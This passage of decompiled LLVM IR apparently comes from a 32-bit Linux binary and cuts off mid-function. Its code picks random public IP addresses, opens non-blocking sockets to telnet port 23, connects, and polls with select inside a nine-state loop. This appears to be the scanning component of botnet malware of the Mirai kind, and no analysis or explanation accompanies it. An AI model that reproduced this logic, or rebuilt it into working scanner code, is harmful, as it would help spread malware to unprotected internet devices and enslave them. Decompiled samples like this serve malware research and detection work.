  %v0_8049fcc = load i32, i32* @ebx, align 4
  %v2_8049fd2 = mul i32 %v0_8049fcc, 24
  %v1_8049fd7 = add i32 %v2_8049fd5, %v2_8049fd2
  %v2_8049fda = inttoptr i32 %v1_8049fd7 to i32*
  store i32 %v1_8049fbf, i32* %v2_8049fda, align 4
  store i32 %storemerge579, i32* %edx.global-to-local, align 4
  %v1_8049fed = add i32 %v2_8049fd5, %v2_8049fac
  store i32 %v1_8049fed, i32* %eax.global-to-local, align 4
  %v1_8049ff0 = inttoptr i32 %v1_8049fed to i32*
  %v2_8049ff0 = load i32, i32* %v1_8049ff0, align 4
  store i32 %v2_8049ff0, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_8049ff9 = load i32, i32* @esp, align 4
  %v2_8049ffc = add i32 %v0_8049ff9, -8
  %v3_8049ffc = inttoptr i32 %v2_8049ffc to i32*
  store i32 1024, i32* %v3_8049ffc, align 4
  %v1_8049ffd = add i32 %v0_8049ff9, -12
  %v2_8049ffd = inttoptr i32 %v1_8049ffd to i32*
  store i32 0, i32* %v2_8049ffd, align 4
  %v0_8049fff = load i32, i32* %edx.global-to-local, align 4
  %v2_8049fff = add i32 %v0_8049ff9, -16
  %v3_8049fff = inttoptr i32 %v2_8049fff to i32*
  store i32 %v0_8049fff, i32* %v3_8049fff, align 4
  %v3_804a000 = inttoptr i32 %storemerge579 to i8*
  %v4_804a000 = call i32 @__GI_memset(i8* %v3_804a000, i32 %tmp18, i32 %tmp23)
  %v4_804a008 = add nuw nsw i32 %storemerge579, 1
  store i32 %v4_804a008, i32* %eax.global-to-local, align 4
  %v5_804a011 = icmp slt i32 %v4_804a008, %.v2_8049ee0
  br i1 %v5_804a011, label %dec_label_pc_8049fa0, label %dec_label_pc_804a013.preheader

dec_label_pc_804a013.preheader:                   ; preds = %entry, %dec_label_pc_8049fa0
  %v2_804a391 = ptrtoint i32* %stack_var_-172 to i32
  %tmp45 = bitcast i32* %stack_var_-172 to i8*
  %v2_804a400 = ptrtoint i32* %stack_var_-180 to i32
  %v2_804a451 = ptrtoint i32* %stack_var_-184 to i32
  %v2_804a458 = ptrtoint i32* %stack_var_-188 to i32
  %v2_804a02e = or i32 %v2_8049f6b, 8
  %v2_804a137 = or i32 %v2_8049f6b, 11
  %.pre = or i32 %v2_8049f6b, 10
  %v2_804a7de = add i32 %v2_8049f6b, 16
  br label %dec_label_pc_804a013

dec_label_pc_804a013:                             ; preds = %dec_label_pc_804a013, %dec_label_pc_804b3cf, %dec_label_pc_804a013.preheader
  %stack_var_-252.0 = phi i8* [ %tmp10, %dec_label_pc_804a013.preheader ], [ %stack_var_-252.0, %dec_label_pc_804a013 ], [ %stack_var_-252.1, %dec_label_pc_804b3cf ]
  %stack_var_-248.0 = phi i8* [ %tmp11, %dec_label_pc_804a013.preheader ], [ %stack_var_-248.0, %dec_label_pc_804a013 ], [ %stack_var_-248.1, %dec_label_pc_804b3cf ]
  %stack_var_-244.0 = phi i8* [ %tmp12, %dec_label_pc_804a013.preheader ], [ %stack_var_-244.0, %dec_label_pc_804a013 ], [ %stack_var_-244.1, %dec_label_pc_804b3cf ]
  %stack_var_-240.0 = phi i32 [ %tmp13, %dec_label_pc_804a013.preheader ], [ %stack_var_-240.0, %dec_label_pc_804a013 ], [ %stack_var_-240.1, %dec_label_pc_804b3cf ]
  %stack_var_-236.0 = phi i32 [ %tmp14, %dec_label_pc_804a013.preheader ], [ %stack_var_-236.0, %dec_label_pc_804a013 ], [ %stack_var_-236.1, %dec_label_pc_804b3cf ]
  %stack_var_-232.0 = phi i32 [ %tmp15, %dec_label_pc_804a013.preheader ], [ %stack_var_-232.0, %dec_label_pc_804a013 ], [ %stack_var_-232.1, %dec_label_pc_804b3cf ]
  %stack_var_-228.0 = phi i32 [ %tmp16, %dec_label_pc_804a013.preheader ], [ %stack_var_-228.0, %dec_label_pc_804a013 ], [ %stack_var_-228.1, %dec_label_pc_804b3cf ]
  %stack_var_-224.0 = phi i32 [ %tmp17, %dec_label_pc_804a013.preheader ], [ %stack_var_-224.0, %dec_label_pc_804a013 ], [ %stack_var_-224.1, %dec_label_pc_804b3cf ]
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_804a01178, label %dec_label_pc_804a01f, label %dec_label_pc_804a013

dec_label_pc_804a01f:                             ; preds = %dec_label_pc_804a013, %dec_label_pc_804b3cf
  %v1_804a14566 = phi i32 [ %v4_804b3cf, %dec_label_pc_804b3cf ], [ 0, %dec_label_pc_804a013 ]
  %stack_var_-224.264 = phi i32 [ %stack_var_-224.1, %dec_label_pc_804b3cf ], [ %stack_var_-224.0, %dec_label_pc_804a013 ]
  %stack_var_-228.262 = phi i32 [ %stack_var_-228.1, %dec_label_pc_804b3cf ], [ %stack_var_-228.0, %dec_label_pc_804a013 ]
  %stack_var_-232.260 = phi i32 [ %stack_var_-232.1, %dec_label_pc_804b3cf ], [ %stack_var_-232.0, %dec_label_pc_804a013 ]
  %stack_var_-236.258 = phi i32 [ %stack_var_-236.1, %dec_label_pc_804b3cf ], [ %stack_var_-236.0, %dec_label_pc_804a013 ]
  %stack_var_-240.256 = phi i32 [ %stack_var_-240.1, %dec_label_pc_804b3cf ], [ %stack_var_-240.0, %dec_label_pc_804a013 ]
  %stack_var_-244.254 = phi i8* [ %stack_var_-244.1, %dec_label_pc_804b3cf ], [ %stack_var_-244.0, %dec_label_pc_804a013 ]
  %stack_var_-248.252 = phi i8* [ %stack_var_-248.1, %dec_label_pc_804b3cf ], [ %stack_var_-248.0, %dec_label_pc_804a013 ]
  %stack_var_-252.250 = phi i8* [ %stack_var_-252.1, %dec_label_pc_804b3cf ], [ %stack_var_-252.0, %dec_label_pc_804a013 ]
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  %v2_804a02b = mul nuw nsw i32 %v1_804a14566, 24
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a02e = add i32 %v2_804a02e, %v2_804a02b
  %v4_804a02e = inttoptr i32 %v3_804a02e to i8*
  %v5_804a02e = load i8, i8* %v4_804a02e, align 8
  %v6_804a02e = zext i8 %v5_804a02e to i32
  %v8_804a02e = and i32 %v2_804a02b, -256
  %v9_804a02e = or i32 %v6_804a02e, %v8_804a02e
  store i32 %v9_804a02e, i32* %eax.global-to-local, align 4
  store i32 %v6_804a02e, i32* %edx.global-to-local, align 4
  store i32 %v6_804a02e, i32* @edi, align 4
  %v1_804a052 = mul nuw nsw i32 %v6_804a02e, 4
  %v2_804a052 = add nuw nsw i32 %v1_804a052, 134556076
  %v3_804a052 = inttoptr i32 %v2_804a052 to i32*
  %v4_804a052 = load i32, i32* %v3_804a052, align 4
  store i32 %v4_804a052, i32* %eax.global-to-local, align 4
  switch i8 %v5_804a02e, label %dec_label_pc_804b3cf [
    i8 0, label %dec_label_pc_804a05b
    i8 1, label %dec_label_pc_804a348
    i8 2, label %dec_label_pc_804a646
    i8 3, label %dec_label_pc_804a85f
    i8 4, label %dec_label_pc_804a9ba
    i8 5, label %dec_label_pc_804ac57
    i8 6, label %dec_label_pc_804adb2
    i8 7, label %dec_label_pc_804b0d4
    i8 8, label %dec_label_pc_804b25e
  ]

dec_label_pc_804a05b:                             ; preds = %dec_label_pc_804a01f
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  %v2_804a06a = add i32 %v2_804a02b, %v2_8049f6b
  %v1_804a06c = add i32 %v2_804a06a, 20
  store i32 %v1_804a06c, i32* %eax.global-to-local, align 4
  %v1_804a06f = inttoptr i32 %v1_804a06c to i32*
  %v2_804a06f = load i32, i32* %v1_804a06f, align 4
  store i32 %v2_804a06f, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_804a078 = load i32, i32* @esp, align 4
  %v2_804a07b = add i32 %v0_804a078, -8
  %v3_804a07b = inttoptr i32 %v2_804a07b to i32*
  store i32 1024, i32* %v3_804a07b, align 4
  %v1_804a07c = add i32 %v0_804a078, -12
  %v2_804a07c = inttoptr i32 %v1_804a07c to i32*
  store i32 0, i32* %v2_804a07c, align 4
  %v0_804a07e = load i32, i32* %edx.global-to-local, align 4
  %v2_804a07e = add i32 %v0_804a078, -16
  %v3_804a07e = inttoptr i32 %v2_804a07e to i32*
  store i32 %v0_804a07e, i32* %v3_804a07e, align 4
  %v3_804a07f = inttoptr i32 %v6_804a02e to i8*
  %v4_804a07f = call i32 @__GI_memset(i8* %v3_804a07f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a096 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804a096 = inttoptr i32 %v3_804a096 to i8*
  %v5_804a096 = load i8, i8* %v4_804a096, align 1
  %v4_804a09a = icmp eq i8 %v5_804a096, 0
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  br i1 %v4_804a09a, label %dec_label_pc_804a128, label %dec_label_pc_804a0a2

dec_label_pc_804a0a2:                             ; preds = %dec_label_pc_804a05b
  store i32 %v1_804a06c, i32* %eax.global-to-local, align 4
  %v2_804a0b6 = load i32, i32* %v1_804a06f, align 4
  store i32 %v2_804a06a, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804a0d2 = inttoptr i32 %v2_804a06a to i32*
  store i32 0, i32* %v2_804a0d2, align 8
  %v0_804a0d4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0d4 = add i32 %v0_804a0d4, 4
  store i32 %v1_804a0d4, i32* %eax.global-to-local, align 4
  %v0_804a0d7 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0d7 = inttoptr i32 %v1_804a0d4 to i32*
  store i32 %v0_804a0d7, i32* %v2_804a0d7, align 4
  %v0_804a0d9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0d9 = add i32 %v0_804a0d9, 4
  store i32 %v1_804a0d9, i32* %eax.global-to-local, align 4
  %v0_804a0dc = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0dc = inttoptr i32 %v1_804a0d9 to i32*
  store i32 %v0_804a0dc, i32* %v2_804a0dc, align 4
  %v0_804a0de = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0de = add i32 %v0_804a0de, 4
  store i32 %v1_804a0de, i32* %eax.global-to-local, align 4
  %v0_804a0e1 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0e1 = inttoptr i32 %v1_804a0de to i32*
  store i32 %v0_804a0e1, i32* %v2_804a0e1, align 4
  %v0_804a0e3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0e3 = add i32 %v0_804a0e3, 4
  store i32 %v1_804a0e3, i32* %eax.global-to-local, align 4
  %v0_804a0e6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0e6 = inttoptr i32 %v1_804a0e3 to i32*
  store i32 %v0_804a0e6, i32* %v2_804a0e6, align 4
  %v0_804a0e8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0e8 = add i32 %v0_804a0e8, 4
  %v0_804a0eb = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0eb = inttoptr i32 %v1_804a0e8 to i32*
  store i32 %v0_804a0eb, i32* %v2_804a0eb, align 4
  store i32 %v1_804a06c, i32* %edx.global-to-local, align 4
  store i32 %v2_804a0b6, i32* @eax, align 4
  store i32 %v2_804a0b6, i32* %v1_804a06f, align 4
  store i32 %v1_804a14566, i32* @ebx, align 4
  %v1_804a109 = call i32 @getRandomPublicIP(i32 %v2_804a0b6)
  store i32 %v2_8049f6b, i32* %edx.global-to-local, align 4
  %v0_804a113 = load i32, i32* @ebx, align 4
  %v2_804a119 = mul i32 %v0_804a113, 24
  %v2_804a11c = add i32 %v2_804a119, %v2_8049f6b
  %v1_804a11e = or i32 %v2_804a11c, 4
  store i32 %v1_804a11e, i32* %eax.global-to-local, align 4
  %v2_804a121 = inttoptr i32 %v1_804a11e to i32*
  store i32 %v1_804a109, i32* %v2_804a121, align 4
  br label %dec_label_pc_804a1cf

dec_label_pc_804a128:                             ; preds = %dec_label_pc_804a05b
  %v3_804a137 = add i32 %v2_804a137, %v2_804a02b
  %v4_804a137 = inttoptr i32 %v3_804a137 to i8*
  %v5_804a137 = load i8, i8* %v4_804a137, align 1
  %v6_804a137 = zext i8 %v5_804a137 to i32
  %v9_804a137 = or i32 %v6_804a137, %v8_804a02e
  %v1_804a13b = add i32 %v9_804a137, 1
  store i32 %v1_804a13b, i32* %ebx.global-to-local, align 4
  %v1_804a14a = trunc i32 %v1_804a13b to i8
  store i8 %v1_804a14a, i8* %v4_804a137, align 1
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v5_804a15d = load i8, i8* %v4_804a137, align 1
  %v6_804a15d = zext i8 %v5_804a15d to i32
  %v9_804a15d = or i32 %v6_804a15d, %v8_804a02e
  store i32 %v9_804a15d, i32* %eax.global-to-local, align 4
  %v10_804a161 = icmp eq i8 %v5_804a15d, 10
  %v1_804a163 = icmp eq i1 %v10_804a161, false
  br i1 %v1_804a163, label %dec_label_pc_804a128.dec_label_pc_804a19f_crit_edge, label %dec_label_pc_804a165

dec_label_pc_804a128.dec_label_pc_804a19f_crit_edge: ; preds = %dec_label_pc_804a128
  %.pre7 = add i32 %.pre, %v2_804a02b
  %.pre8 = inttoptr i32 %.pre7 to i8*
  br label %dec_label_pc_804a19f

dec_label_pc_804a165:                             ; preds = %dec_label_pc_804a128
  store i8 0, i8* %v4_804a137, align 1
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a188 = add i32 %.pre, %v2_804a02b
  %v4_804a188 = inttoptr i32 %v3_804a188 to i8*
  %v5_804a188 = load i8, i8* %v4_804a188, align 2
  %v6_804a188 = zext i8 %v5_804a188 to i32
  %v9_804a188 = or i32 %v6_804a188, %v8_804a02e
  %v1_804a18c = add i32 %v9_804a188, 1
  store i32 %v1_804a18c, i32* %ebx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v1_804a19b = trunc i32 %v1_804a18c to i8
  store i8 %v1_804a19b, i8* %v4_804a188, align 2
  br label %dec_label_pc_804a19f

dec_label_pc_804a19f:                             ; preds = %dec_label_pc_804a128.dec_label_pc_804a19f_crit_edge, %dec_label_pc_804a165
  %v4_804a1ae.pre-phi = phi i8* [ %.pre8, %dec_label_pc_804a128.dec_label_pc_804a19f_crit_edge ], [ %v4_804a188, %dec_label_pc_804a165 ]
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v5_804a1ae = load i8, i8* %v4_804a1ae.pre-phi, align 1
  %v6_804a1ae = zext i8 %v5_804a1ae to i32
  %v9_804a1ae = or i32 %v6_804a1ae, %v8_804a02e
  store i32 %v9_804a1ae, i32* %eax.global-to-local, align 4
  %v10_804a1b2 = icmp eq i8 %v5_804a1ae, 3
  %v1_804a1b4 = icmp eq i1 %v10_804a1b2, false
  br i1 %v1_804a1b4, label %dec_label_pc_804a19f.dec_label_pc_804a1cf_crit_edge, label %dec_label_pc_804a1b6

dec_label_pc_804a19f.dec_label_pc_804a1cf_crit_edge: ; preds = %dec_label_pc_804a19f
  %.pre9 = inttoptr i32 %v2_804a06a to i32*
  br label %dec_label_pc_804a1cf

dec_label_pc_804a1b6:                             ; preds = %dec_label_pc_804a19f
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804a096, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804a1cf:                             ; preds = %dec_label_pc_804a19f.dec_label_pc_804a1cf_crit_edge, %dec_label_pc_804a0a2
  %v3_804a252.pre-phi = phi i32* [ %.pre9, %dec_label_pc_804a19f.dec_label_pc_804a1cf_crit_edge ], [ %v2_804a0d2, %dec_label_pc_804a0a2 ]
  store i32 2, i32* %stack_var_-204, align 4
  %v0_804a1d8 = load i32, i32* @esp, align 4
  %v1_804a1db = add i32 %v0_804a1d8, -16
  %v2_804a1db = inttoptr i32 %v1_804a1db to i32*
  store i32 23, i32* %v2_804a1db, align 4
  %v0_804a1dd = load i32, i32* %stack_var_-204, align 4
  %v1_804a1dd = call i32 @htons(i32 %v0_804a1dd)
  %v0_804a1e2 = load i32, i32* @esp, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  %v1_804a213 = or i32 %v2_804a06a, 4
  store i32 %v1_804a213, i32* %eax.global-to-local, align 4
  %v1_804a216 = inttoptr i32 %v1_804a213 to i32*
  %v2_804a216 = load i32, i32* %v1_804a216, align 4
  store i32 %v2_804a216, i32* %eax.global-to-local, align 4
  store i32 %v1_804a14566, i32* @ebx, align 4
  %v1_804a224 = add i32 %v0_804a1e2, 8
  %v2_804a224 = inttoptr i32 %v1_804a224 to i32*
  store i32 0, i32* %v2_804a224, align 4
  %v1_804a226 = add i32 %v0_804a1e2, 4
  %v2_804a226 = inttoptr i32 %v1_804a226 to i32*
  store i32 1, i32* %v2_804a226, align 4
  %v2_804a228 = inttoptr i32 %v0_804a1e2 to i32*
  store i32 2, i32* %v2_804a228, align 4
  %sext = mul i32 %v1_804a1dd, 65536
  %v3_804a22a = sdiv i32 %sext, 65536
  %v4_804a22a = call i32 @socket(i32 %v3_804a22a, i32 %v2_804a216, i32 0)
  %v0_804a237 = load i32, i32* @ebx, align 4
  %v2_804a23d = mul i32 %v0_804a237, 24
  %v3_804a240 = add i32 %v2_804a23d, %v2_8049f6b
  %v4_804a240 = inttoptr i32 %v3_804a240 to i32*
  store i32 %v4_804a22a, i32* %v4_804a240, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a252 = load i32, i32* %v3_804a252.pre-phi, align 4
  store i32 %v4_804a252, i32* %eax.global-to-local, align 4
  %v10_804a255 = icmp eq i32 %v4_804a252, -1
  br i1 %v10_804a255, label %dec_label_pc_804b3cf, label %dec_label_pc_804a25e

dec_label_pc_804a25e:                             ; preds = %dec_label_pc_804a1cf
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a26d = load i32, i32* %v3_804a252.pre-phi, align 4
  store i32 %v4_804a26d, i32* %eax.global-to-local, align 4
  %v0_804a270 = load i32, i32* @esp, align 4
  %v1_804a273 = add i32 %v0_804a270, -8
  %v2_804a273 = inttoptr i32 %v1_804a273 to i32*
  store i32 0, i32* %v2_804a273, align 4
  %v1_804a275 = add i32 %v0_804a270, -12
  %v2_804a275 = inttoptr i32 %v1_804a275 to i32*
  store i32 3, i32* %v2_804a275, align 4
  %v0_804a277 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a277 = add i32 %v0_804a270, -16
  %v3_804a277 = inttoptr i32 %v2_804a277 to i32*
  store i32 %v0_804a277, i32* %v3_804a277, align 4
  %v3_804a278 = call i32 @__libc_fcntl(i32 %v2_804a216, i32 0, i32 0)
  %v0_804a27d = load i32, i32* @esp, align 4
  %v12_804a282 = or i32 %v3_804a278, 2048
  store i32 %v12_804a282, i32* @ebx, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a294 = load i32, i32* %v3_804a252.pre-phi, align 4
  store i32 %v4_804a294, i32* %eax.global-to-local, align 4
  %v2_804a29a = add i32 %v0_804a27d, 8
  %v3_804a29a = inttoptr i32 %v2_804a29a to i32*
  store i32 %v12_804a282, i32* %v3_804a29a, align 4
  %v1_804a29b = add i32 %v0_804a27d, 4
  %v2_804a29b = inttoptr i32 %v1_804a29b to i32*
  store i32 4, i32* %v2_804a29b, align 4
  %v0_804a29d = load i32, i32* %eax.global-to-local, align 4
  %v3_804a29d = inttoptr i32 %v0_804a27d to i32*
  store i32 %v0_804a29d, i32* %v3_804a29d, align 4
  %v3_804a29e = call i32 @__libc_fcntl(i32 %v2_804a216, i32 0, i32 0)
  %v0_804a2a3 = load i32, i32* @esp, align 4
  store i32 %v2_8049f2a, i32* @ebx, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a2bb = load i32, i32* %v3_804a252.pre-phi, align 4
  store i32 %v4_804a2bb, i32* %eax.global-to-local, align 4
  %v1_804a2c1 = add i32 %v0_804a2a3, 8
  %v2_804a2c1 = inttoptr i32 %v1_804a2c1 to i32*
  store i32 16, i32* %v2_804a2c1, align 4
  %v2_804a2c3 = add i32 %v0_804a2a3, 4
  %v3_804a2c3 = inttoptr i32 %v2_804a2c3 to i32*
  store i32 %v2_8049f2a, i32* %v3_804a2c3, align 4
  %v0_804a2c4 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a2c4 = inttoptr i32 %v0_804a2a3 to i32*
  store i32 %v0_804a2c4, i32* %v3_804a2c4, align 4
  %v3_804a2c5 = call i32 @__libc_connect(i32 %v2_804a216, i32 0, i32 0)
  store i32 %v3_804a2c5, i32* %eax.global-to-local, align 4
  %v10_804a2cd = icmp eq i32 %v3_804a2c5, -1
  %v1_804a2d0 = icmp eq i1 %v10_804a2cd, false
  br i1 %v1_804a2d0, label %dec_label_pc_804a315, label %dec_label_pc_804a2d2

dec_label_pc_804a2d2:                             ; preds = %dec_label_pc_804a25e
  %v1_804a2d2 = call i32 @__errno_location(i32 %v2_804a216)
  store i32 %v1_804a2d2, i32* %eax.global-to-local, align 4
  %v1_804a2d7 = inttoptr i32 %v1_804a2d2 to i32*
  %v2_804a2d7 = load i32, i32* %v1_804a2d7, align 4
  store i32 %v2_804a2d7, i32* %eax.global-to-local, align 4
  %v9_804a2d9 = icmp eq i32 %v2_804a2d7, 115
  br i1 %v9_804a2d9, label %dec_label_pc_804a315, label %dec_label_pc_804a2de

dec_label_pc_804a2de:                             ; preds = %dec_label_pc_804a2d2
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a2ed = load i32, i32* %v3_804a252.pre-phi, align 4
  store i32 %v4_804a2ed, i32* %eax.global-to-local, align 4
  %v0_804a2f0 = load i32, i32* @esp, align 4
  %v2_804a2f3 = add i32 %v0_804a2f0, -16
  %v3_804a2f3 = inttoptr i32 %v2_804a2f3 to i32*
  store i32 %v4_804a2ed, i32* %v3_804a2f3, align 4
  %v1_804a2f4 = call i32 @sclose(i32 %v2_804a216)
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804a096, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804a315:                             ; preds = %dec_label_pc_804a2d2, %dec_label_pc_804a25e
  store i8 1, i8* %v4_804a02e, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  %v1_804a33a = add i32 %v2_804a06a, 12
  store i32 %v1_804a33a, i32* %eax.global-to-local, align 4
  %v1_804a33d = inttoptr i32 %v1_804a33a to i32*
  store i32 0, i32* %v1_804a33d, align 4
  br label %dec_label_pc_804b3cf

dec_label_pc_804a348:                             ; preds = %dec_label_pc_804a01f
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  %v2_804a357 = add i32 %v2_804a02b, %v2_8049f6b
  %v1_804a359 = add i32 %v2_804a357, 12
  store i32 %v1_804a359, i32* %eax.global-to-local, align 4
  %v1_804a35c = inttoptr i32 %v1_804a359 to i32*
  %v2_804a35c = load i32, i32* %v1_804a35c, align 4
  store i32 %v2_804a35c, i32* %eax.global-to-local, align 4
  %v1_804a35e = icmp eq i32 %v2_804a35c, 0
  %v1_804a360 = icmp eq i1 %v1_804a35e, false
  br i1 %v1_804a360, label %dec_label_pc_804a387, label %dec_label_pc_804a362

dec_label_pc_804a362:                             ; preds = %dec_label_pc_804a348
  store i32 %v1_804a14566, i32* @ebx, align 4
  %v0_804a365 = load i32, i32* @esp, align 4
  %v1_804a368 = add i32 %v0_804a365, -16
  %v2_804a368 = inttoptr i32 %v1_804a368 to i32*
  store i32 0, i32* %v2_804a368, align 4
  %v1_804a36a = inttoptr i32 %v6_804a02e to i32*
  %v2_804a36a = call i32 @__GI_time(i32* %v1_804a36a)
  store i32 %v2_8049f6b, i32* %edx.global-to-local, align 4
  %v0_804a377 = load i32, i32* @ebx, align 4
  %v2_804a37d = mul i32 %v0_804a377, 24
  %v2_804a380 = add i32 %v2_804a37d, %v2_8049f6b
  %v1_804a382 = add i32 %v2_804a380, 12
  store i32 %v1_804a382, i32* %eax.global-to-local, align 4
  %v2_804a385 = inttoptr i32 %v1_804a382 to i32*
  store i32 %v2_804a36a, i32* %v2_804a385, align 4
  br label %dec_label_pc_804a387

dec_label_pc_804a387:                             ; preds = %dec_label_pc_804a348, %dec_label_pc_804a362
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804a391, i32* @edi, align 4
  %v5_804a398 = call i8* @_memset(i8* %tmp45, i32 0, i32 32)
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a3af = inttoptr i32 %v2_804a357 to i32*
  %v4_804a3af = load i32, i32* %v3_804a3af, align 8
  %v2_804a3b4 = udiv i32 %v4_804a3af, 32
  store i32 %v2_804a3b4, i32* @ebx, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a3c6 = load i32, i32* %v3_804a3af, align 8
  %v1_804a3c9 = urem i32 %v4_804a3c6, 32
  store i32 %v1_804a3c9, i32* %eax.global-to-local, align 4
  %v0_804a3cc = load i32, i32* @ebp, align 4
  %v2_804a3cc = mul nuw nsw i32 %v2_804a3b4, 4
  %v3_804a3cc = add nsw i32 %v2_804a3cc, -168
  %v4_804a3cc = add i32 %v3_804a3cc, %v0_804a3cc
  %v5_804a3cc = inttoptr i32 %v4_804a3cc to i32*
  %v6_804a3cc = load i32, i32* %v5_804a3cc, align 4
  %v9_804a3cc = shl i32 1, %v1_804a3c9
  %v12_804a3cc = or i32 %v6_804a3cc, %v9_804a3cc
  store i32 %v12_804a3cc, i32* %v5_804a3cc, align 4
  store i32 0, i32* %stack_var_-180, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a3f7 = load i32, i32* %v3_804a3af, align 8
  %v1_804a3fa = add i32 %v4_804a3f7, 1
  store i32 %v1_804a3fa, i32* %edx.global-to-local, align 4
  %v0_804a3fd = load i32, i32* @esp, align 4
  %v2_804a406 = add i32 %v0_804a3fd, -16
  %v3_804a406 = inttoptr i32 %v2_804a406 to i32*
  store i32 %v2_804a400, i32* %v3_804a406, align 4
  %v1_804a407 = add i32 %v0_804a3fd, -20
  %v2_804a407 = inttoptr i32 %v1_804a407 to i32*
  store i32 0, i32* %v2_804a407, align 4
  store i32 %v2_804a391, i32* %eax.global-to-local, align 4
  %v2_804a40f = add i32 %v0_804a3fd, -24
  %v3_804a40f = inttoptr i32 %v2_804a40f to i32*
  store i32 %v2_804a391, i32* %v3_804a40f, align 4
  %v1_804a410 = add i32 %v0_804a3fd, -28
  %v2_804a410 = inttoptr i32 %v1_804a410 to i32*
  store i32 0, i32* %v2_804a410, align 4
  %v0_804a412 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a412 = add i32 %v0_804a3fd, -32
  %v3_804a412 = inttoptr i32 %v2_804a412 to i32*
  store i32 %v0_804a412, i32* %v3_804a412, align 4
  %v0_804a413 = load i32, i32* %stack_var_-180, align 4
  %v2_804a413 = load i32, i32* %stack_var_-172, align 4
  %v5_804a413 = call i32 @__libc_select(i32 %v0_804a413, i32 10000, i32 %v2_804a413, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804a413, i32* %eax.global-to-local, align 4
  %v0_804a418 = load i32, i32* @esp, align 4
  %v12_804a41e = icmp eq i32 %v5_804a413, 1
  %v1_804a422 = icmp eq i1 %v12_804a41e, false
  br i1 %v1_804a422, label %dec_label_pc_804a581, label %dec_label_pc_804a428

dec_label_pc_804a428:                             ; preds = %dec_label_pc_804a387
  store i32 4, i32* %stack_var_-184, align 4
  store i32 0, i32* %stack_var_-188, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a44b = load i32, i32* %v3_804a3af, align 8
  store i32 %v4_804a44b, i32* %edx.global-to-local, align 4
  %v2_804a457 = add i32 %v0_804a418, 16
  %v3_804a457 = inttoptr i32 %v2_804a457 to i32*
  store i32 %v2_804a451, i32* %v3_804a457, align 4
  store i32 %v2_804a458, i32* %eax.global-to-local, align 4
  %v2_804a45e = add i32 %v0_804a418, 12
  %v3_804a45e = inttoptr i32 %v2_804a45e to i32*
  store i32 %v2_804a458, i32* %v3_804a45e, align 4
  %v1_804a45f = add i32 %v0_804a418, 8
  %v2_804a45f = inttoptr i32 %v1_804a45f to i32*
  store i32 4, i32* %v2_804a45f, align 4
  %v1_804a461 = add i32 %v0_804a418, 4
  %v2_804a461 = inttoptr i32 %v1_804a461 to i32*
  store i32 1, i32* %v2_804a461, align 4
  %v0_804a463 = load i32, i32* %edx.global-to-local, align 4
